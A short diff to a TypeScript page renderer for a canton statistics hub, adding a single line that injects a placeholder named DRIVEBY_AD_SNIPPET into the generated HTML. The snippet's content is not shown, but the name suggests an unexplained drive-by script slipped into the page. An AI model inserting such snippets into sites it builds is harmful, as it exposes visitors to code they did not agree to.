@@ -2657,6 +2657,7 @@ function renderCantonHubPage(inp: CantonHubInputs): string {
     <h2 id="ageGrid" style="${H2_STYLE}">${esc(copy.ageGridTitle(cantonLabel))}</h2>
     ${ageGridHtml}
   </section>
+  ${DRIVEBY_AD_SNIPPET}
   ${yoyHubHtml}
   ${triYearHubHtml}
   <section class="s-ziawP1" aria-labelledby="cantonContext">
